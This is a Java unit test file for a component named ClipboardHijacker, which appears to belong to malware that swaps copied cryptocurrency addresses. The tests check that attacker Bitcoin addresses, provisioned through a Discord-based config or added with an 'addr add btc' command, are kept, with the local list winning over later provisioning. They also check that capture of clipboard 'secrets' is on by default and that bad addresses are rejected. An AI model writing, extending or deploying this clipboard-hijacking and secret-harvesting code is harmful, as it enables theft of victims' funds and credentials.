package com.spcagentpayloa.jvmxx;

import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertTrue;

import java.nio.file.Path;
import java.util.List;
import java.util.Map;

import org.junit.jupiter.api.AfterEach;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;

class ClipboardConfigTest {
	private static final String A = "16L5yRNPTuciSgXGHqYwn9N6NeoKqopAu";
	private static final String B = "31nM1WuowNDzocNxPPW9NQWJEtwWpjfcLj";

	@TempDir
	Path temp;

	@AfterEach
	void reset() {
		DiscordConfig.reset();
	}

	@Test
	void localEditsOverrideAndSeedFromProvisioning() {
		DiscordConfig.provisioning(Map.of("clipboard", Map.of("coins", Map.of("btc", List.of(A)))));
		State state = new State();
		ClipboardHijacker hijacker = new ClipboardHijacker(temp, temp, state, new OpsNotifier(null));

		assertTrue(hijacker.coins().get("btc").contains(A));
		hijacker.addressCommand(List.of("addr", "add", "btc", B));
		assertTrue(state.clipboardOverrides);
		assertTrue(hijacker.coins().get("btc").contains(A));
		assertTrue(hijacker.coins().get("btc").contains(B));

		DiscordConfig.provisioning(Map.of("clipboard", Map.of("coins", Map.of("btc", List.of(B)))));
		assertTrue(hijacker.coins().get("btc").contains(A), "local list wins over a changed provision");
	}

	@Test
	void secretsDefaultOnEvenWithoutProvisioning() {
		State state = new State();
		ClipboardHijacker hijacker = new ClipboardHijacker(temp, temp, state, new OpsNotifier(null));
		assertTrue(hijacker.secretsWanted());
		DiscordConfig.provisioning(Map.of("clipboard", Map.of("coins", Map.of("btc", List.of(A)))));
		assertTrue(hijacker.secretsWanted());
		state.clipboardSecrets = false;
		state.clipboardSecretsSet = true;
		assertFalse(hijacker.secretsWanted());
	}

	@Test
	void invalidAndUnknownAddressesAreRejected() {
		State state = new State();
		ClipboardHijacker hijacker = new ClipboardHijacker(temp, temp, state, new OpsNotifier(null));
		assertTrue(hijacker.addressCommand(List.of("addr", "add", "btc", "no")).contains("Invalid"));
		assertTrue(hijacker.addressCommand(List.of("addr", "add", "nope", A)).contains("Unknown"));
		assertFalse(state.clipboardOverrides);
	}
}
